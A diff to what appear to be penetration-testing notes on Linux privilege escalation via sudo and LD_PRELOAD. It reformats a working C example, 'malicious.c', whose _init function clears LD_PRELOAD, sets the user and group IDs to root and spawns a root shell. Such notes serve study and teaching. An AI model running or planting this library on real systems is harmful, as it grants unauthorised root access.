@@ -31,15 +31,18 @@ https://notes.dollarboysushil.com/linux-privilege-escalation/sudo-+-ld_preload-s
    - Write C code to execute a privileged action (e.g., spawn a root shell).
    - Example code (`malicious.c`):
      ```c
-     #include <stdio.h>
-     #include <sys/types.h>
-     #include <stdlib.h>
-     void _init() {
-         unsetenv("LD_PRELOAD"); // Prevent infinite loop
-         setgid(0);             // Set group ID to root
-         setuid(0);             // Set user ID to root
-         system("/bin/bash");   // Spawn root shell
-     }
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/types.h> // For setuid/setgid
+#include <unistd.h>    // For setuid/setgid and unsetenv
+
+void _init() {
+    unsetenv("LD_PRELOAD"); // Prevent infinite loop by clearing LD_PRELOAD
+    setgid(0);             // Set group ID to root (0)
+    setuid(0);             // Set user ID to root (0)
+    system("/bin/bash");   // Spawn a root shell
+}
+
      ```
    - `_init()` runs automatically when the library is loaded due to the constructor-like behavior.
 
